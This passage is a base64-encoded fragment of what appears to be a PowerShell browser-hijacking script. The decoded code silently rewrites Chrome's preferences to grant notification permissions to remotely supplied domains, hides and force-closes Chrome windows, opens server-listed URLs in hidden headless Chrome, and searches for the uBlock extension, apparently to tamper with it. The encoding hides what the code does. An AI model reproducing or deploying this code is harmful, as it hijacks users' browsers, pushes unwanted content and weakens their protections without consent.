AgICBpZiAoJHNwZWNpZmljU2V0dGluZy5QU09iamVjdC5Qcm9wZXJ0aWVzLk5hbWUgLWNvbnRhaW5zICRwdXNoRG9tYWluKSB7ICAgICAgICAgICAgDQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRzcGVjaWZpY1NldHRpbmcgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAkcHVzaERvbWFpbiAtVmFsdWUgQHsNCiAgICAgICAgICAgICAgICAgICAgImxhc3RfbW9kaWZpZWQiID0gIjEzMzYyNzIwNTQ1Nzg1Nzc0Ig0KICAgICAgICAgICAgICAgICAgICAic2V0dGluZyIgPSAxDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRjb250ZW50U2V0dGluZ3MuJHNldHRpbmcgPSAkc3BlY2lmaWNTZXR0aW5nDQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zID0gJGNvbnRlbnRTZXR0aW5ncw0KICAgICAgICAkdXBkYXRlZFByZWZlcmVuY2VzSnNvbiA9ICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMTANCiAgICAgICAgJHVwZGF0ZWRQcmVmZXJlbmNlc0pzb24gfCBTZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1FbmNvZGluZyBVVEY4DQoNCiAgICAgICAgd3JpdGVkYmcgIk5vdGlmaWNhdGlvbiBzdWJzY3JpcHRpb24gZm9yICRwdXNoRG9tYWluIGFkZGVkIHN1Y2Nlc3NmdWxseSB3aXRoIGFsbCBwZXJtaXNzaW9ucy4iDQogICAgfSBlbHNlIHsNCiAgICAgICAgd3JpdGVkYmcgIlByZWZlcmVuY2VzIGZpbGUgbm90IGZvdW5kIGF0IHBhdGg6ICRwcmVmZXJlbmNlc1BhdGgiDQogICAgfQ0KfQ0KDQoNCg0KZnVuY3Rpb24gQ2xvc2UtQ2hyb21lV2luZG93IHsNCiAgICBwYXJhbSAoJHdpbmRvdykNCiAgICBbVXNlcjMyWF06OkNsb3NlV2luZG93KCR3aW5kb3cpIHwgT3V0LU51bGwNCiAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDI1DQp9DQoNCmZ1bmN0aW9uIENsb3NlLUNocm9tZSB7DQogICAgcGFyYW0gKCRwcm9jZXNzKQ0KICAgIENsb3NlLUNocm9tZVdpbmRvdyAtd2luZG93ICRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUNCiAgICB0cnkgew0KICAgICAgICAkcHJvY2Vzcy5DbG9zZSgpDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIENsb3NlLUFsbENocm9tZXMgew0KICAgICR3aW5kb3dzID0gW1VzZXIzMlhdOjpFbnVtZXJhdGVBbGxXaW5kb3dzKCkNCiAgICBmb3JlYWNoICgkd2luZG93IGluICR3aW5kb3dzKSANCiAgICB7DQogICAgICAgICR0aXRsZSA9IFtVc2VyMzJYXTo6R2V0V2luZG93VGV4dCgkd2luZG93KQ0KICAgICAgICBpZiAoJHRpdGxlLkNvbnRhaW5zKCJHb29nbGUgQ2hyb21lIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIFtVc2VyMzJYXTo6U2hvd1dpbmRvdygkd2luZG93LCBbVXNlcjMyWF06OlNXX0hJREUpIHwgT3V0LU51bGwNCiAgICAgICAgICAgIENsb3NlLUNocm9tZVdpbmRvdyAtd2luZG93ICR3aW5kb3cNCiAgICAgICAgfQ0KICAgIH0NCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnY2hyb21lLmV4ZScpKQ0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNQ0KfQ0KDQpmdW5jdGlvbiBDb25maWd1cmVDaHJvbWVQdXNoZXMgew0KICAgICRhdXRvID0gVGVzdC1BdXRvc3RhcnQ7DQogICAgaWYgKCRzZXJ2ZXIucHVzaGVzRm9yY2UgLW5lICRmYWxzZSAtYW5kICRhdXRvIC1lcSAkdHJ1ZSkNCiAgICB7DQogICAgICAgIHdyaXRlZGJnICJTa2lwcGluZyBDb25maWd1cmVDaHJvbWVQdXNoZXMiDQogICAgICAgIHJldHVybg0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICANCiAgIA0KDQogICAgQWRkLVR5cGUgQCINCiAgICB1c2luZyBTeXN0ZW07DQogICAgdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQogICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KICAgIHVzaW5nIFN5c3RlbS5UZXh0Ow0KDQogICAgcHVibGljIHN0YXRpYyBjbGFzcyBVc2VyMzJYIHsNCiAgICAgICAgcHVibGljIGRlbGVnYXRlIGJvb2wgRW51bVdpbmRvd3NQcm9jKEludFB0ciBoV25kLCBJbnRQdHIgbFBhcmFtKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIEVudW1XaW5kb3dzKEVudW1XaW5kb3dzUHJvYyBscEVudW1GdW5jLCBJbnRQdHIgbFBhcmFtKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCwgU3RyaW5nQnVpbGRlciBscFN0cmluZywgaW50IG5NYXhDb3VudCk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd1RleHRMZW5ndGgoSW50UHRyIGhXbmQpOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgSXNXaW5kb3dWaXNpYmxlKEludFB0ciBoV25kKTsNCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRXaW5kb3dUZXh0KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICBpbnQgbGVuZ3RoID0gR2V0V2luZG93VGV4dExlbmd0aChoV25kKTsNCiAgICAgICAgICAgIGlmIChsZW5ndGggPT0gMCkgcmV0dXJuIFN0cmluZy5FbXB0eTsNCg0KICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzYiA9IG5ldyBTdHJpbmdCdWlsZGVyKGxlbmd0aCArIDEpOw0KICAgICAgICAgICAgR2V0V2luZG93VGV4dChoV25kLCBzYiwgc2IuQ2FwYWNpdHkpOw0KICAgICAgICAgICAgcmV0dXJuIHNiLlRvU3RyaW5nKCk7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgSXNXaW5kb3dWaXNpYmxlRXgoSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgIHJldHVybiBJc1dpbmRvd1Zpc2libGUoaFduZCkgJiYgR2V0V2luZG93VGV4dExlbmd0aChoV25kKSA+IDA7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIEludFB0cltdIEVudW1lcmF0ZUFsbFdpbmRvd3MoKSB7DQogICAgICAgICAgICB2YXIgd2luZG93SGFuZGxlcyA9IG5ldyBMaXN0PEludFB0cj4oKTsNCiAgICAgICAgICAgIEVudW1XaW5kb3dzKChoV25kLCBsUGFyYW0pID0+IHsNCiAgICAgICAgICAgICAgICBpZiAoSXNXaW5kb3dWaXNpYmxlRXgoaFduZCkpIHsNCiAgICAgICAgICAgICAgICAgICAgd2luZG93SGFuZGxlcy5BZGQoaFduZCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfSwgSW50UHRyLlplcm8pOw0KICAgICAgICAgICAgcmV0dXJuIHdpbmRvd0hhbmRsZXMuVG9BcnJheSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coSW50UHRyIGhXbmQsIGludCBuQ21kU2hvdyk7DQoNCiAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19ISURFID0gMDsNCiAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19NSU5JTUlaRSA9IDY7DQogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfU0hPVyA9IDU7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFBvc3RNZXNzYWdlKEludFB0ciBoV25kLCB1aW50IE1zZywgSW50UHRyIHdQYXJhbSwgSW50UHRyIGxQYXJhbSk7DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIENsb3NlV2luZG93KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICBjb25zdCB1aW50IFdNX0NMT1NFID0gMHgwMDEwOw0KICAgICAgICAgICAgUG9zdE1lc3NhZ2UoaFduZCwgV01fQ0xPU0UsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybyk7DQogICAgICAgIH0NCiAgICB9DQoiQA0KDQogICAgaWYgKEhhdmVUb1B1c2hlcykNCiAgICB7DQogICAgICAgIENsb3NlLUFsbENocm9tZXM7DQogICAgICAgIFJlbW92ZS1QdXNoZXM7DQogICAgICAgIEFkZC1QdXNoZXM7DQogICAgfQ0KDQp9DQpjYXRjaCB7DQogICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkIChDb25maWd1cmUgQ2hyb21lIFB1c2hlcyk6ICRfIg0KfQ0KfQ0KDQoNCg0KZnVuY3Rpb24gT3Blbi1DaHJvbWVXaXRoVXJsIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHVybCwgJGlzRGVidWcNCiAgICApDQogICAgJGpvYiA9IFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgew0KICAgICAgICAgICAgcGFyYW0gKCR1cmwsICRpc0RlYnVnKQ0KDQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIA0KIA0KICAgICAgICAgICAgQWRkLVR5cGUgQCINCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbTsNCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOw0KICAgICAgICAgICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KICAgICAgICAgICAgdXNpbmcgU3lzdGVtLlRleHQ7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgVXNlcjMyWCB7DQogICAgICAgICAgICAgICAgcHVibGljIGRlbGVnYXRlIGJvb2wgRW51bVdpbmRvd3NQcm9jKEludFB0ciBoV25kLCBJbnRQdHIgbFBhcmFtKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBFbnVtV2luZG93cyhFbnVtV2luZG93c1Byb2MgbHBFbnVtRnVuYywgSW50UHRyIGxQYXJhbSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0KEludFB0ciBoV25kLCBTdHJpbmdCdWlsZGVyIGxwU3RyaW5nLCBpbnQgbk1heENvdW50KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd1RleHRMZW5ndGgoSW50UHRyIGhXbmQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIElzV2luZG93VmlzaWJsZShJbnRQdHIgaFduZCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRXaW5kb3dUZXh0KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICAgICAgICAgIGludCBsZW5ndGggPSBHZXRXaW5kb3dUZXh0TGVuZ3RoKGhXbmQpOw0KICAgICAgICAgICAgICAgICAgICBpZiAobGVuZ3RoID09IDApIHJldHVybiBTdHJpbmcuRW1wdHk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzYiA9IG5ldyBTdHJpbmdCdWlsZGVyKGxlbmd0aCArIDEpOw0KICAgICAgICAgICAgICAgICAgICBHZXRXaW5kb3dUZXh0KGhXbmQsIHNiLCBzYi5DYXBhY2l0eSk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzYi5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBJc1dpbmRvd1Zpc2libGVFeChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gSXNXaW5kb3dWaXNpYmxlKGhXbmQpICYmIEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCkgPiAwOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgSW50UHRyW10gRW51bWVyYXRlQWxsV2luZG93cygpIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHdpbmRvd0hhbmRsZXMgPSBuZXcgTGlzdDxJbnRQdHI+KCk7DQogICAgICAgICAgICAgICAgICAgIEVudW1XaW5kb3dzKChoV25kLCBsUGFyYW0pID0+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChJc1dpbmRvd1Zpc2libGVFeChoV25kKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvd0hhbmRsZXMuQWRkKGhXbmQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICAgICAgICAgIH0sIEludFB0ci5aZXJvKTsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHdpbmRvd0hhbmRsZXMuVG9BcnJheSgpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coSW50UHRyIGhXbmQsIGludCBuQ21kU2hvdyk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX0hJREUgPSAwOw0KICAgICAgICAgICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfTUlOSU1JWkUgPSA2Ow0KICAgICAgICAgICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfU0hPVyA9IDU7DQogICAgICAgICAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19NQVhJTUlaRSA9IDM7IC8vIEFkZGVkIGNvbnN0YW50IGZvciBtYXhpbWl6aW5nIHdpbmRvdw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgUG9zdE1lc3NhZ2UoSW50UHRyIGhXbmQsIHVpbnQgTXNnLCBJbnRQdHIgd1BhcmFtLCBJbnRQdHIgbFBhcmFtKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBDbG9zZVdpbmRvdyhJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgICAgICAgICBjb25zdCB1aW50IFdNX0NMT1NFID0gMHgwMDEwOw0KICAgICAgICAgICAgICAgICAgICBQb3N0TWVzc2FnZShoV25kLCBXTV9DTE9TRSwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoiQA0KfQ0KY2F0Y2ggew0KfQ0KICAgICAgICANCiAgICAgICAgZnVuY3Rpb24gQ2xvc2UtQ2hyb21lV2luZG93IHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgcGFyYW0gKCR3aW5kb3cpDQogICAgICAgICAgICAgICAgW1VzZXIzMlhdOjpDbG9zZVdpbmRvdygkd2luZG93KSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAxMDANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHt9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGZ1bmN0aW9uIENsb3NlLUNocm9tZSB7DQogICAgICAgICAgICBwYXJhbSAoJHByb2Nlc3MpDQogICAgICAgICAgICBDbG9zZS1DaHJvbWVXaW5kb3cgLXdpbmRvdyAkcHJvY2Vzcy5NYWluV2luZG93SGFuZGxlDQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICRwcm9jZXNzIHwgU3RvcC1Qcm9jZXNzIC1Gb3JjZQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2ggew0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgJGNocm9tZVBhdGhzID0gQCgNCiAgICAgICAgICAgICJDOlxQcm9ncmFtIEZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICAgICAiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAgICAgIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICAgICAiJGVudjpQcm9ncmFtRmlsZXNcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwNCiAgICAgICAgICAgICIkZW52OlByb2dyYW1GaWxlcyh4ODYpXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSINCiAgICAgICAgKQ0KICAgICAgICAkcmVzb2x2ZWRQYXRocyA9IEAoKQ0KICAgICAgICBmb3JlYWNoICgkcGF0aCBpbiAkY2hyb21lUGF0aHMpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJHJlc29sdmVkUGF0aCA9IFJlc29sdmUtUGF0aCAtUGF0aCAkcGF0aCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICAgICAgICAgIGlmICgkcmVzb2x2ZWRQYXRoIC1ub3RpbiAkcmVzb2x2ZWRQYXRocykgew0KICAgICAgICAgICAgICAgICAgICAkcmVzb2x2ZWRQYXRocyArPSAkcmVzb2x2ZWRQYXRoLlBhdGgNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiRXJyb3IgcmVzb2x2aW5nIHBhdGg6ICRfIg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRyZXNvbHZlZFBhdGhzID0gJHJlc29sdmVkUGF0aHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUNCiAgICAgICAgZm9yZWFjaCAoJHBhdGggaW4gJHJlc29sdmVkUGF0aHMpIHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJHBhdGgpIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiRm91bmQgQ2hyb21lIGF0OiAkcGF0aCINCiAgICANCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5GaWxlTmFtZSA9ICRwYXRoDQogICAgICAgICAgICAgICAgaWYgKC1ub3QgJGlzRGVidWcpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5Bcmd1bWVudHMgPSAiLS1oZWFkbGVzcyI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLkFyZ3VtZW50cyArPSAiIC0tZGlzYWJsZS1ncHUgLS1kdW1wLWRvbSAkdXJsIg0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLkNyZWF0ZU5vV2luZG93ID0gJGZhbHNlDQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlDQogICAgICAgICAgICAgICAgJHByb2Nlc3MgPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzDQogICAgICAgICAgICAgICAgJHByb2Nlc3MuU3RhcnRJbmZvID0gJHByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgICAgICAgICAkcHJvY2Vzcy5TdGFydCgpIHwgT3V0LU51bGwgICAgICAgICANCiAgICAgICAgICAgICAgICAkZW5kVGltZSA9IChHZXQtRGF0ZSkuQWRkU2Vjb25kcyg4KQ0KICAgICAgICAgICAgICAgIHdoaWxlICgoR2V0LURhdGUpIC1sdCAkZW5kVGltZSkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoJGlzRGVidWcgLWVxICRmYWxzZSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgW1VzZXIzMlhdOjpTaG93V2luZG93KCRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUsIFtVc2VyMzJYXTo6U1dfSElERSkgfCBPdXQtTnVsbCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAwDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgW1VzZXIzMlhdOjpTaG93V2luZG93KCRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUsIFtVc2VyMzJYXTo6U1dfU0hPVykgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgQ2xvc2UtQ2hyb21lIC1wcm9jZXNzICRwcm9jZXNzDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgd3JpdGVkYmcgIkNocm9tZSBub3QgZm91bmQgYXQ6ICRwYXRoIg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICB9IC1Bcmd1bWVudExpc3QgJHVybCwgJGlzRGVidWcNCg0KICAgIHJldHVybiAkam9iDQp9DQoNCmZ1bmN0aW9uIExhdW5jaENocm9tZVB1c2hlcyB7DQogICAgJGF1dG8gPSBUZXN0LUF1dG9zdGFydDsNCiAgICBpZiAoJHNlcnZlci5wdXNoZXNGb3JjZSAtbmUgJGZhbHNlIC1hbmQgJGF1dG8gLWVxICR0cnVlKQ0KICAgIHsNCiAgICAgICAgd3JpdGVkYmcgIlNraXBwaW5nIGZ1bmN0aW9uIExhdW5jaENocm9tZVB1c2hlcyINCiAgICAgICAgcmV0dXJuDQogICAgfQ0KICAgIHRyeSB7DQogICAgICAgIGZvcmVhY2ggKCRwdXNoIGluICRzZXJ2ZXIucHVzaGVzKSB7DQogICAgICAgICAgICAkaXNEZWJ1ZyA9IElzRGVidWcNCiAgICAgICAgICAgIE9wZW4tQ2hyb21lV2l0aFVybCAtdXJsICRwdXNoIC1pc0RlYnVnICRpc0RlYnVnDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkIExhdW5jaENocm9tZVB1c2hlcyk6ICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZG9fY2hyb21lX3B1c2ggew0KICAgIENvbmZpZ3VyZUNocm9tZVB1c2hlcw0KICAgIExhdW5jaENocm9tZVB1c2hlcw0KfQ0KDQpmdW5jdGlvbiBkb19jaHJvbWVfdWJsb2NrIHsNCiAgICAka2V5d29yZHMgPSBAKCJ1QmxvY2siKQ0KDQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIHsNCiAgICAgICAgJGNocm9tZURpciA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggIkdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcRXh0ZW5zaW9ucyINCiAgICAgICAgDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRjaHJvbWVEaXIgLVBhdGhUeXBlIENvbnRhaW5lcikgew0KICAgICAgICAgICAgICAgICRleHRlbnNpb25zID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkY2hyb21lRGlyIC1EaXJlY3RvcnkNCg0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRleHRlbnNpb24gaW4gJGV4dGVuc2lvbnMpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1hbkZpbGUgPSBjaHJvbWV1YmxvY2tfRmluZE1hbmlmZXN0RmlsZSAtZm9sZGVyICRleHRlbnNpb24uRnVsbE5hbWUNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRtYW5GaWxlIC1uZSAiIikgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGZvdW5kS2V5d29yZCA9ICRmYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkbWFuaWZlc3RWYWx1ZSBpbiAka2V5d29yZHMpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRtYW5GaWxlIC1SYXcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGNvbnRlbnQgLW1hdGNoIFtyZWdleF06OkVzY2FwZSgkbWFuaWZlc3RWYWx1ZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZvdW5kS2V5d29yZCA9ICR0cnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGZvdW5kS2V5d29yZCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRleHRGb2xkZXJOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJGV4dGVuc2lvbi5GdWxsTmFtZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWV1YmxvY2tfUHJvY2Vzc01hbmlmZXN0QWxsIC1leHROYW1lICRleHRGb2xkZXJOYW1lDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAg